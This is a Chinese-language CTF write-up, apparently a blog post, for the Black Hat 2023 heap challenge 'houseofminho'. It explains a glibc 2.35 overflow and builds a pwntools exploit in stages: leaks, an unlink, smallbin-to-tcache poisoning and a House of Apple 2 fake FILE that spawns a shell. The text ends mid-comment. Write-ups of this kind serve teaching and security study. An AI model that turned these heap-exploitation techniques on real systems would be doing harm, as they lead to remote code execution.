{"title":"[Black Hat 2023] Pwn Houseofminho Csome writeup","date":"2023-11-18T03:37:18.000Z","toc":true,"source":"_posts/houseofminho-wp.md","raw":"---\ntitle: \"[Black Hat 2023] Pwn Houseofminho Csome writeup\"\ncomments: true\ntoc: true\ndate: 2023-11-18 11:37:18\ntags:\n  - CTF\n  - Pwn\n  - 2023BlackHat\n---\n\n# 前言\n\n这个是2023 black hat第二天的一道0解pwn题\n\nhttps://gitee.com/csomebro/ctftask/blob/master/2023-11_BlackHat/houseofminho.zip\n\n# 题目\n\n出题人很友好的给了源码\n\n```C\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define SIZE_SMALL 0x40\n#define SIZE_BIG   0x80\n\nchar *g_buf;\n\nint getint(const char *msg) {\n  int val;\n  printf(\"%s\", msg);\n  if (scanf(\"%d%*c\", &val) != 1) exit(1);\n  return val;\n}\n\nint main() {\n  setvbuf(stdout, NULL, _IONBF, 0);\n\n  while (1) {\n    puts(\"1. new\\n2. show\\n3. delete\");\n    switch (getint(\"> \")) {\n      case 1: { /* new */\n        if (g_buf) {\n          puts(\"[-] Buffer in use\");\n          break;\n        }\n\n        if (getint(\"Size [1=small / 2=big]: \") == 1) {\n          g_buf = (char*)malloc(SIZE_SMALL);\n        } else {\n          g_buf = (char*)malloc(SIZE_BIG);\n        }\n\n        printf(\"Data: \");\n        read(STDIN_FILENO, g_buf, SIZE_BIG);\n        g_buf[strcspn(g_buf, \"\\n\")] = '\\0';\n        break;\n      }\n\n      case 2: { /* show */\n        if (!g_buf) {\n          puts(\"[-] Empty buffer\");\n        } else {\n          printf(\"Data: %s\\n\", g_buf);\n        }\n        break;\n      }\n\n      case 3: { /* delete */\n        if (!g_buf) {\n          puts(\"[-] Empty buffer\");\n        } else {\n          free(g_buf);\n          g_buf = NULL;\n        }\n        break;\n      }\n\n      default:\n        puts(\"[+] Bye!\");\n        return 0;\n    }\n  }\n}\n\n```\n\n题面十分的简短，主要实现了三个功能，分别为\n\n1. add功能，可以申请`malloc(0x80)`以及`malloc(0x40)`，无论申请哪一个，都会`read(0, g_buf, 0x80)`\n2. show功能，直接打印`g_buf`\n3. free功能，`free(g_buf)`之后，清空`g_buf`\n\nGlibc 版本 为2.35-3.1\n\n# 漏洞\n\n显而易见，漏洞就在add功能中`read(0, g_buf, 0x80)`，但是局限十分多\n\n1. 申请堆块的大小被严格限制，只有0x40和0x80两种申请\n2. 可以保存的堆块仅仅只有一块，也就是如果需要再次malloc，必须先free\n\n那么会带来什么问题呢？\n\n首先glibc 2.35已经限制了tcache bin内的chunk不能多malloc一次，也就是如果对应位置的count为0，就不会申请出来，这就否定了直接溢出修改fd导致任意地址申请的方法\n\n```\np = malloc(0x40)\nfree(p)\np = malloc(0x80)\nfree(p)\np = malloc(0x40) // 重新申请回上述的0x40块\nread(0, p, 0x80) // 溢出写入到下方的0x80块的fd，并修改size改小\nfree(p)\np = malloc(0x80)\nfree(p) // 由于上文改小了size，那么这里释放的时候就不会进入0x90的管理\np = malloc(0x80) // 此时再次申请，如果低版本的tcache就可以申请出任意地址，但是2.35不行\n```\n\n**上述的做法是行不通的！**上述操作之后，0x90管理的位置count已经为0了，所以下次malloc(0x80)就不会从0x90的tcache取出，无法达成任意地址申请\n\n![image-20231117232223970](houseofminho-wp/image-20231117232223970.png)\n\n但是上述做法给了一个思路，我们可以通过多次free再次malloc 0x40就可以申请回来第一个堆块，并写入0x80长度，这个溢出很稳定，以及我们可以修改下一个堆块大小，使得绕过tcache多次申请0x90的堆块，那么现在我们需要修改tcachebin管理0x90的count值，使得可以任意地址申请。但是这个很难做到，怎么做呢？请读者继续往下看。\n\n# 信息收集\n\n如何泄露libc？如何泄露堆地址？\n\n## 泄露Libc地址\n\n首先我们需要使用House of orange的一个技巧，将Top Chunk的size改小，然后申请一个大的堆块就可以把，Top Chunk放入Unsorted bin内，之后利用溢出覆盖size就可以泄露libc地址了。\n\n但是这里有一个极大的问题！Top chunk需要对其0x1000，但是已有的堆+0x40或者0x80都不可能对齐0x1000，怎么办？\n\n这里需要提到在没有setbuf(stdin,0);的情况下，scanf的输入长文本，回调用malloc、realloc、free，其中如果scanf输入数据大小为0x1000，那么会产生一下调用\n\n```c\np = malloc(0x800);\np = realloc(p, 0x1000);\np = realloc(p, 0x2000);\nfree(p)\n```\n\n那么我们就可以完成Top Chunk的攻击了，以下是泄露libc的exp，并修复损坏的size\n\n```python\nadd(1, b\"a\" * 0x48 + p64(0xd11))\nshow2(0x1000)\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nlibc_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) - 0x219ce0\nlog.success(f\"libc_base : {libc_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x48 + p64(0xcf1))\n```\n\n此时堆块的布局如下\n\n![image-20231118000114704](houseofminho-wp/image-20231118000114704.png)\n\n为何下方有0x10的两个块呢？那就需要了解一下unsortedbin的检查\n\n在`_int_malloc`中有这么一串代码\n\n```C\nwhile ((victim = unsorted_chunks (av)->bk) != unsorted_chunks (av))\n        {\n          bck = victim->bk;\n          size = chunksize (victim);\n          mchunkptr next = chunk_at_offset (victim, size);\n\n          if (__glibc_unlikely (size <= CHUNK_HDR_SZ)\n              || __glibc_unlikely (size > av->system_mem))\n            malloc_printerr (\"malloc(): invalid size (unsorted)\");\n          if (__glibc_unlikely (chunksize_nomask (next) < CHUNK_HDR_SZ)\n              || __glibc_unlikely (chunksize_nomask (next) > av->system_mem))\n            malloc_printerr (\"malloc(): invalid next size (unsorted)\");\n          if (__glibc_unlikely ((prev_size (next) & ~(SIZE_BITS)) != size))\n            malloc_printerr (\"malloc(): mismatching next->prev_size (unsorted)\");\n          if (__glibc_unlikely (bck->fd != victim)\n              || __glibc_unlikely (victim->fd != unsorted_chunks (av)))\n            malloc_printerr (\"malloc(): unsorted double linked list corrupted\");\n          if (__glibc_unlikely (prev_inuse (next)))\n            malloc_printerr (\"malloc(): invalid next->prev_inuse (unsorted)\");\n```\n\n总结一下就是\n\n1. 检查当前unsorted bin内的块`size`位是不是合法的，是否满足`0x10 <= size <= system_mem`\n2. 检查当前块下物理地址相邻的下一块`size`是不是合法的，是否满足`0x10 <= size <= system_mem`\n3. 检查物理地址相邻的下一块`size`的`prev_size`是否和自己的`size`相等\n4. 检查当前指针的`bck->fd`是否等于自己，以及自己的`fd`是否是`main_arena`内的一个特定地址\n5. 最后检查物理地址相邻的下一块的`prev_inuse`是不是`0`\n\n那么如果正常逻辑下Top Chunk被free到unsorted bin，说明当前内存应该全部分配完了，如果原封不动直接放到unsorted bin内，就会触发上述第2、3、5的检查不合法或者溢出，所以为了防止这个事情发生，就需要在下方设置两个小哨兵块，A块的作用是满足上述第2、3、5的检查，设置prev_size等关键数据，而**B块的作用是防止A块发生unlink合并**，B块的`prev_inuse`标志是1，代表A块是使用中，所以不会发生unlink，否则unlink会报错（试想一下，如果没有B块，那么A块没有被使用的，如果申请一个刚好大小为当前unsortbin的块，再释放，那么就会触发向前合并unlink，之后由于A块的fd和bk指针问题，导致程序crash）\n\n![image-20231118001409448](houseofminho-wp/image-20231118001409448.png)\n\n到这里，我们压一下脑栈，上述的unsorted bin布局，后文会使用到，我们回到泄露上\n\n## 泄露heap地址\n\n泄露heap地址相对简单，直接free当前堆块后，由于tcache bin的fd指针具有`REVEAL_PTR`的保护，所以Tcache bin的第一块由于fd是0，但是被加密之后会变成`0 ^ (heap_adde >> 12)`的值，故可以直接泄露堆地址\n\n```C\n#define PROTECT_PTR(pos, ptr) \\\n  ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))\n#define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)\n```\n\n泄露并修复的exp如下（当前exp衔接泄露libc的）\n\n```python\n... # 衔接上文泄露libc\nfree()\nadd(2, b\"a\")\nfree()\nadd(1, b\"aaaa\")\nfree()\nadd(2, b\"aaaa\")\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nheap_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) << 12\nlog.success(f\"heap_base : {heap_base:#x}\")\n# 一下两行仅仅作为临时修复，使得堆布局好看一点，正式攻击可以删除\nfree()\nadd(1, b\"a\" * 0x40 + p64(0) + p64(0x91))\n```\n\n此时heap地址、Libc地址信息已经收集完毕！我们来看看现在堆长什么样子\n\n![image-20231118002652903](houseofminho-wp/image-20231118002652903.png)\n\n当前我们可控的堆块已经标注在图中，为啥叫做可控呢？因为由于tcache的原因，以及我们只能拥有一个堆块，所以free malloc交替进行我们只能控制这两个区域内存（？这两个区域内存我们应该如何做文章呢？请读者压一压脑栈继续往下看。）\n\n![image-20231118002710057](houseofminho-wp/image-20231118002710057.png)\n\n# 利用攻击\n\n信息收集终于结束了，堆也变成了不认识的样子，那么我们攻击的入口在哪里呢？\n\n## Small bin -> Tcache bin\n\n答案是`Small bin`！\n\n为何选用Small bin呢？阅读源码我们可以知道，Small bin是有机会进入Tcache的，什么时机进入呢？在malloc中如果命中了Small bin某个大小的管理，那么就会将这个大小内的剩下所有块依次取出，放入Tcache内，直至填满Tcache\n\n```C\nif (in_smallbin_range (nb))\n    {\n      idx = smallbin_index (nb);\n      bin = bin_at (av, idx);\n\n      if ((victim = last (bin)) != bin)\n        {\n          bck = victim->bk;\n\t  if (__glibc_unlikely (bck->fd != victim))\n\t    malloc_printerr (\"malloc(): smallbin double linked list corrupted\");\n          set_inuse_bit_at_offset (victim, nb);\n          bin->bk = bck;\n          bck->fd = bin;\n\n          if (av != &main_arena)\n\t    set_non_main_arena (victim);\n          check_malloced_chunk (av, victim, nb);\n#if USE_TCACHE\n\t  /* While we're here, if we see other chunks of the same size,\n\t     stash them in the tcache.  */\n\t  size_t tc_idx = csize2tidx (nb);\n\t  if (tcache != NULL && tc_idx < mp_.tcache_bins)\n\t    {\n\t      mchunkptr tc_victim;\n\n\t      /* While bin not empty and tcache not full, copy chunks over.  */\n\t      while (tcache->counts[tc_idx] < mp_.tcache_count\n\t\t     && (tc_victim = last (bin)) != bin)\n\t\t{\n\t\t  if (tc_victim != 0)\n\t\t    {\n\t\t      bck = tc_victim->bk;\n\t\t      set_inuse_bit_at_offset (tc_victim, nb);\n\t\t      if (av != &main_arena)\n\t\t\tset_non_main_arena (tc_victim);\n\t\t      bin->bk = bck;\n\t\t      bck->fd = bin;\n\n\t\t      tcache_put (tc_victim, tc_idx); // !!!!!! 注意这里 放入了tcache内\n\t            }\n\t\t}\n\t    }\n#endif\n          void *p = chunk2mem (victim);\n          alloc_perturb (p, bytes);\n          return p;\n        }\n    }\n\n```\n\n也就是代码中的这个部分，下面代码中，bin就是当前small bin的位置，通过bk索引，反向查找，对于每一个Chunk依次解链，放入了Tcache bin中\n\n```C\nwhile (tcache->counts[tc_idx] < mp_.tcache_count && (tc_victim = last (bin)) != bin) {\n      if (tc_victim != 0) {\n          bck = tc_victim->bk;\n          set_inuse_bit_at_offset (tc_victim, nb);\n          if (av != &main_arena)\n            set_non_main_arena (tc_victim);\n          bin->bk = bck;\n          bck->fd = bin;\n          \n          tcache_put (tc_victim, tc_idx); // !!!!!! 注意这里 放入了tcache内\n        }\n    }\n}\n```\n\n目标明确，那么命中small bin需要先绕过Tcache，也就是当前`Tcache[0x90]`不能有free的堆块，以及需要一次`malloc(0x80)`，那么我们伪造的small bin大小也需要是0x90\n\n## 伪造Small bin（0x90）可行性讨论\n\n如何伪造一个0x90大小的Small bin呢？进入Small bin可以从Unsorted bin进入，如何进入呢？\n\n1. 当前Unsorted bin中有一个0x90大小的堆块空闲\n2. malloc一次大于0x90大小的堆块`size >= 0x90 && malloc(size)`，且不能命中Tcache\n\n条件2比较简单满足，依旧是scanf利用\n\n对于我们现在的堆块布局来说，我们仅仅只能控制0x90堆块size位（看上文的泄露后堆布局情况图片），这个位置能做什么文章呢？那么答案十分明朗：**伪造Unsorted bin！**\n\n我们先讨论一下，是否可行，我们能溢出可控空间为`0x80-0x40=0x40`，这个0x40大小的空间包括了下一个堆块的`prev_size`和`size`位置，以及堆块内容部分。假设我们能修改上图中0x90堆块的size位置改大，并能成功free，那么就会进入unsorted bin中，**如果此时构造我们无法完成两块小哨兵块的布置**，因为需要如下的布局\n\n```\n     | prev_size |  size  |\n     +--------------------+\n0x00 |           |  0x50  |    \n0x10 |           |        |    -- 可控起始位置\n     +--------------------+   <- Unsorted bin\n0x50 |           |  0x91  |\n0x90 |           |        |    \n0xD0 |           |        |    -- 可控终止位置\n     +--------------------+\n0xE0 |           |  0x10  |    -- Chunk A\n     +--------------------+\n0xF0 |           |  0x11  |    -- Chunk B\n     +--------------------+\n```\n\n（可控地址指的是，我们可以通过malloc(0x40)向后写0x80字节，以及malloc(0x80)也能写0x80字节，上面例子也就是总长度可控为`0x80*2-0x40=0xC0`）\n\n但是可控空间完全不够布置下面的Chunk AB，要怎么办呢？我们需要可控多长呢？\n\n在绞尽脑汁几个小时之后，我注意到了我们貌似浪费了0x50堆块中的0x40长度的大小。怎么办呢？\n\n## Unlink扩展溢出距离\n\n这里我们可以利用Unlink手法，使得Unsorted bin向前合并，首先我们构造如下的布局\n\n```\n     | prev_size |  size      |\n     +------------------------+\n0x00 |           |  0x50      |    \n0x10 | fd        |  bk        |    -- 可控起始位置\n0x20 |           |  0x31      |\n0x30 | fake fd   |  fake bk   |\n     +------------------------+    \n0x50 | 0x30      |  0x?0      |    -- 这里的prev_inuse设置为0\n0x90 |           |            |    \n0xD0 |           |            |    -- 可控终止位置\n     +------------------------+\n```\n\n使得在free掉下方堆块的时候可以向后合并，这样子就可以完成溢出可控距离的扩展\n\n那么这个时候再来讨论一下可控长度，我们此时修改Unsorted bin内的布局，此时我们发现可控距离完全足够进行布局了！\n\n```\n     | prev_size |  size      |\n     +------------------------+\n0x00 |           |  0x50      |    \n0x10 | fd        |  bk        |    -- 可控起始位置\n     +------------------------+\n0x20 |           |  0x91      |    <- Unsorted bin  \n0x90 |           |            |\n     +------------------------+\n0xB0 |           |  0x10      |    -- Chunk A\n     +------------------------+\n0xC0 |           |  0x11      |    -- Chunk B\n     +------------------------+\n0xD0 |           |            |    -- 可控终止位置\n```\n\n（仔细观察上面三个布局演示，可控起始和终止的偏移从未变化，仅仅通过Unlink之后利用率提高了）\n\n如何实现Unlink？\n\n只需要满足下面的条件\n\n```c\np->fd = p;\np->bk = p;\nnext(p)->prev_inuse = 0;\nnext(p)->prev_size = p->size;\n```\n\n绕过源码中，下面这个检查\n\n```C\n  mchunkptr fd = p->fd;\n  mchunkptr bk = p->bk;\n  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))\n    malloc_printerr (\"corrupted double-linked list\");\n```\n\n但是但是，现在还有一个问题，实现unlink攻击，需要free掉一个大的堆块进入Unsorted bin内，也就是说，我们需要修改原来0x90堆块的size改大，并需要满足free的Unsorted bin检查，也就是，尽量不要进入向前合并流程（因为我们本来可控的空间就只有上面的`[0x10,0xD0]`），那么需要如何做呢？请读者再压下脑栈，马上就要串起来了，继续往下看！\n\n## 伪造Unsorted bin\n\n我们再次回顾一下当前的堆布局，可以看到当前unsorted bin下方有一个0x10和0x11的堆块，那么我们假设，如果有某种方法，使得0x90这个堆块覆盖成以下的红色框框圈起来呢？并且是否有方法让下方0x11堆块之后的prev_inuse变成1呢？（为何要为1，因为要防止合并）\n\n![image-20231118013645858](houseofminho-wp/image-20231118013645858.png)\n\n什么时候能修改最下方堆块的内容呢？答案是还是`scanf`！\n\nscanf的缓冲区会申请再堆内，那我如果缓冲区足够大是否能够刚好往0x11堆块的后面size内写入一些数据呢？写入多少呢？\n\n`0x33`！！！因为这个ascii字符是`3`，也就是选择free的菜单选项，什么时候写入呢？当然是最最最开始的时候，堆十分“干净”的时候啦\n\n那么经过测试，再所有操作之前输入0xd58个字符0以及一个字符3即可\n\n```python\ndef free3(len):\n    io.sendlineafter(b\"> \", b\"0\" * (len-1) + b\"3\")\n\nfree3(0xd59) # 这里就是污染0x11堆块之后的堆块的size位置\nadd(1, b\"a\" * 0x48 + p64(0xd11))\nshow2(0x1000)\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nlibc_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) - 0x219ce0\nlog.success(f\"libc_base : {libc_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x48 + p64(0xcf1))\n\nfree()\nadd(2, b\"a\")\nfree()\nadd(1, b\"aaaa\")\nfree()\nadd(2, b\"aaaa\")\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nheap_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) << 12\nlog.success(f\"heap_base : {heap_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x40 + p64(0) + p64(0x91))\n```\n\n让我们再看看堆块长什么样子了\n\n![image-20231118014409013](houseofminho-wp/image-20231118014409013.png)\n\nWoW！！成功污染！那么我们就能成功伪造Unsorted bin了，稍微微调以下代码可以得到\n\n```python\nfree3(0xd59) \nadd(1, b\"a\" * 0x48 + p64(0xd11))\nshow2(0x1000)\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nlibc_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) - 0x219ce0\nlog.success(f\"libc_base : {libc_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x48 + p64(0xcf1))\n\nfree()\nadd(2, b\"a\")\nfree()\nadd(1, b\"aaaa\")\nfree()\nadd(2, b\"aaaa\")\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nheap_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) << 12\nlog.success(f\"heap_base : {heap_base:#x}\")\nfree()\n# 这里微调了0x90堆块的size位置，不再是修复而是伪造\nadd(1, b\"a\" * 0x40 + p64(0) + p64(0xd01))\nfree()\nadd(2, b\"aaaa\")\nfree()\n```\n\n此时我们可以看到unsorted bin内如愿以偿的放入了我们的Fake Chunk！\n\n![image-20231118014647807](houseofminho-wp/image-20231118014647807.png)\n\n## Unlink攻击以及Smallbin伪造攻击实施\n\n感谢你耐心看到这里，相信你现在脑栈已经快爆了，终于我们迎来了弹出脑栈的步骤了\n\n将上文的Unlink攻击实施，微调Exp可以得到如下\n\n```python\nfree3(0xd59)\nadd(1, b\"a\" * 0x48 + p64(0xd11))\nshow2(0x1000)\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nlibc_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) - 0x219ce0\nlog.success(f\"libc_base : {libc_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x48 + p64(0xcf1))\n\nfree()\nadd(2, b\"a\")\nfree()\nadd(1, b\"aaaa\")\nfree()\nadd(2, b\"aaaa\")\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nheap_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) << 12\nlog.success(f\"heap_base : {heap_base:#x}\")\nfree()\n# 这里修改了unlink攻击的内容\nadd(1, b\"a\" * 0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0) * 2 +  b\"a\" * 0x10 + p64(0x30) + p64(0xd00))\nfree()\nadd(2, b\"aaaa\")\nfree()\n```\n\n此时堆块就不那么好看了。\n\n![image-20231118015159589](houseofminho-wp/image-20231118015159589.png)\n\n如此查看我们可以发现unlink成功实施了，Unsorted bin内第一个堆块从0xd00变成了0xd30\n\n那么继续我们将伪造Small bin的攻击实施，再次微调Exp\n\n```python\nfree3(0xd59)\nadd(1, b\"a\" * 0x48 + p64(0xd11))\nshow2(0x1000)\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nlibc_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) - 0x219ce0\nlog.success(f\"libc_base : {libc_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x48 + p64(0xcf1))\n\nfree()\nadd(2, b\"a\")\nfree()\nadd(1, b\"aaaa\")\nfree()\nadd(2, b\"aaaa\")\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nheap_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) << 12\nlog.success(f\"heap_base : {heap_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0) * 2 +  b\"a\" * 0x10 + p64(0x30) + p64(0xd00))\nfree()\n# 这次微调了这里，加入了上文提到的Chunk AB的布置\nadd(2, b\"a\" * 0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))\nfree()\n# 这里就开始修改Unsorted bin内容，使得在Unsorted bin内伪造一个Small bin大小的堆块\nadd(1, flat({\n    0x10: 0,\n    0x18: 0x91,\n    0x20: heap_base + 0x380,\n    0x28: libc_base + 0x219ce0,\n}, filler=b\"\\x00\"))\nshow2(0x1000) # 这里触发使得Unsorted bin进入Samll bin\nfree()\n```\n\n让我们再次检验堆块的结构！完美成功进入了Small bin！！！\n\n![image-20231118015627633](houseofminho-wp/image-20231118015627633.png)\n\n那么接下来我们就要开始在Small bin里面伪造一条多个0x90的链条，使得再次malloc(0x80)命中small bin的时候，放入Tcache bin中\n\n## 修改Small bin\n\n首先我们需要知道我们能改动多长？0x80长度，然而除去tcache bin的fd和bk位置，仅剩下0x70长度可以可控，也就是说，我们需要在0x70的长度中尽可能多的伪造0x90堆块，并串起来\n\n我们仅仅只能伪造3个0x90的堆块，如何伪造？\n\n可以参考如下图的伪造方法，可以看到这里bk连线串成了一条链\n\n![houseofminho_smallbin](houseofminho-wp/houseofminho_smallbin.png)\n\n注意红色Chunk位置的fd设置，需要绕过small bin中的检查（下面源码），而黄色的绿色的fd是否需要设置，留给读者们讨论\n\n```C\n\t  if (__glibc_unlikely (bck->fd != victim))\n\t    malloc_printerr (\"malloc(): smallbin double linked list corrupted\");\n```\n\n那么稍微微调一下exp\n\n```python\nfree3(0xd59)\nadd(1, b\"a\" * 0x48 + p64(0xd11))\nshow2(0x1000)\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nlibc_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) - 0x219ce0\nlog.success(f\"libc_base : {libc_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x48 + p64(0xcf1))\n\nfree()\nadd(2, b\"a\")\nfree()\nadd(1, b\"aaaa\")\nfree()\nadd(2, b\"aaaa\")\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nheap_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) << 12\nlog.success(f\"heap_base : {heap_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0) * 2 +  b\"a\" * 0x10 + p64(0x30) + p64(0xd00))\nfree()\nadd(2, b\"a\" * 0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))\nfree()\nadd(1, flat({\n    0x10: 0,\n    0x18: 0x91,\n    0x20: heap_base + 0x380,\n    0x28: libc_base + 0x219ce0,\n}, filler=b\"\\x00\"))\nshow2(0x1000)\nfree()\n\n# 这里加上了Small bin的伪造\nadd(1, flat({\n    0x10 : {\n            0x00: 0,\n            0x08: 0x91,\n            0x10: heap_base + 0x2c0,\n            0x18: heap_base + 0x2c0 + 0x30,\n            \n            0x30: 0,\n            0x38: 0x91,\n            0x40: heap_base + 0x2c0,\n            0x48: heap_base + 0x2c0 + 0x50,\n\n            0x50: 0,\n            0x58: 0x91,\n            0x60: heap_base + 0x2c0 + 0x30,\n            0x68: libc_base + 0x219d60\n        }\n    }\n, filler=b\"\\x00\"))\nfree()\n```\n\n此时堆布局如下\n\n![image-20231118021620888](houseofminho-wp/image-20231118021620888.png)\n\n可以看到出现了错误，不过问题不大，源码时通过BK进行遍历的，在BK位置确实出现了3个Chunk\n\n此时我们就可以malloc(0x80)命中一次Small bin的0x90\n\n```python\nadd(2, b\"aaaa\")\nfree()\n```\n\n那么此时堆块就会变成，下面这样！WoW，我们可以控制Tcache bin 0x90位置的fd指针！并且此时0x90位置的Count有3！！！\n\n![image-20231118022002073](houseofminho-wp/image-20231118022002073.png)\n\n胜利的曙光就在眼前了，接下来是House of apple 2登场！\n\n## House of Apple 2\n\nHouse of Apple 2的教程见https://bbs.kanxue.com/thread-273832.htm，这里膜拜一下Orz\n\n经过我的调优可以简化到如下的布局\n\n```python\nsystem = 0x50d60 + libc_base\nfake_file = flat({\n    0x0: b\"  sh;\",\n    0x28: system,\n    0xa0: fake_file_addr-0x10, # wide data\n    0x88: fake_file_addr+0x100, # 可写，且内存为0即可\n    0xD0: fake_file_addr+0x28-0x68, # wide data vtable\n    0xD8: libc_base + 0x2160C0, # vtable  \n}, filler=b\"\\x00\")\n```\n\n我们需要结合当前的情况在做调整，首先我们需要再次延长可控的空间，方法也简单，毕竟Tcache bin的Count有3，我们可以先伪造一次fd到堆上，再伪造进入`_IO_list_all`\n\n（为何不劫持Tcache bin管理块呢？因为我们只能拥有一个堆块，需要free之后再次malloc才能控制下一个，一旦劫持到Tcachebin 管理块，没有一个合适的size位置，是无法成功free的）\n\n由于大小范围可控需要0xe0长度，所以我们第一个堆块需要扩展一次，使用上面的0x50的堆块对下面0x90tcache的溢出修改，使得布局如下图，这样子Chunk 1申请出来的时候，可以保证能控制到Chunk 2的fd，依旧能继续攻击，也能延长可控范围到0xf0，使得攻击成立，而Chunk 1的size改为0x71是为了防止free之后进入0x90导致后面的Chunk无法取出\n\n![houseofminho_tcachebin](houseofminho-wp/houseofminho_tcachebin.png)\n\n那么经过简单的布置，最终攻击`_IO_list_all`之后，就完成了House of Apple 2的攻击\n\n# 完整Exp\n\n```python\nfrom pwn import *\n\ncontext.log_level = 'info'\ncontext.arch = 'amd64'\n# io = process(\"./minho\")\nio = remote(\"127.0.0.1\", 5000)\ntob = lambda x: str(x).encode()\n\ndef add(size, content):\n    io.sendlineafter(b\"> \", b\"1\")\n    io.sendlineafter(b\"Size [1=small / 2=big]: \", tob(size))\n    io.sendafter(b\"Data: \", content)\n\ndef add2(size_content, content):\n    io.sendlineafter(b\"> \", b\"1\")\n    io.sendlineafter(b\"Size [1=small / 2=big]: \", size_content)\n    io.sendafter(b\"Data: \", content)\n\ndef show():\n    io.sendlineafter(b\"> \", b\"2\")\n\ndef show2(len):\n    io.sendlineafter(b\"> \", b\"0\" * (len-1) + b\"2\")\n\ndef show3(len):\n    io.sendlineafter(b\"> \", b\"0\" * (len-1) + b\"2\" + b\"\\x00\")\n\ndef free():\n    io.sendlineafter(b\"> \", b\"3\")\n\ndef free3(len):\n    io.sendlineafter(b\"> \", b\"0\" * (len-1) + b\"3\")\n\nfree3(0xd59) # 这一行的作用见上文【伪造Unsorted bin】\n\n# 这一部分信息收集见上文【信息收集】\nadd(1, b\"a\" * 0x48 + p64(0xd11))\nshow2(0x1000)\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nlibc_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) - 0x219ce0\nlog.success(f\"libc_base : {libc_base:#x}\")\nfree()\nadd(1, b\"a\" * 0x48 + p64(0xcf1))\n\nfree()\nadd(2, b\"a\")\nfree()\nadd(1, b\"aaaa\")\nfree()\nadd(2, b\"aaaa\")\nfree()\nadd(1, b\"a\" * 0x50)\nshow()\nio.recvuntil(b\"Data: \" + b\"a\" * 0x50)\nheap_base = u64(io.recvuntil(b\"\\n\", drop=True).ljust(8, b\"\\x00\")) << 12\nlog.success(f\"heap_base : {heap_base:#x}\")\nfree()\n\n# 见上文【Unlink攻击以及Smallbin伪造攻击实施】\nadd(1, b\"a\" * 0x10 + p64(0) + p64(0x31) + p64(heap_base+0x2c0) * 2 +  b\"a\" * 0x10 + p64(0x30) + p64(0xd00))\nfree()\nadd(2, b\"a\" * 0x50 + p64(0x90) + p64(0x10) + p64(0x00) + p64(0x11))\nfree()\nadd(1, flat({\n    0x10: 0,\n    0x18: 0x91,\n    0x20: heap_base + 0x380,\n    0x28: libc_base + 0x219ce0,\n}, filler=b\"\\x00\"))\n\nshow2(0x1000)\nfree()\n\n# 见上文【修改Small bin】\nadd(1, flat({\n    0x10 : {\n            0x00: 0,\n            0x08: 0x91,\n            0x10: heap_base + 0x2c0,\n            0x18: heap_base + 0x2c0 + 0x30,\n            \n            0x30: 0,\n            0x38: 0x91,\n            0x40: heap_base + 0x2c0,\n            0x48: heap_base + 0x2c0 + 0x50,\n\n            0x50: 0,\n            0x58: 0x91,\n            0x60: heap_base + 0x2c0 + 0x30,\n            0x68: libc_base + 0x219d60\n        }\n    }\n, filler=b\"\\x00\"))\nfree()\nadd(2, b\"aaaa\")\nfree()\n_IO_list_all = libc_base + 0x21a680\nsystem = 0x50d60 + libc_base\n\nfake_file = heap_base + 0x2e0\n# 见上文House of apple 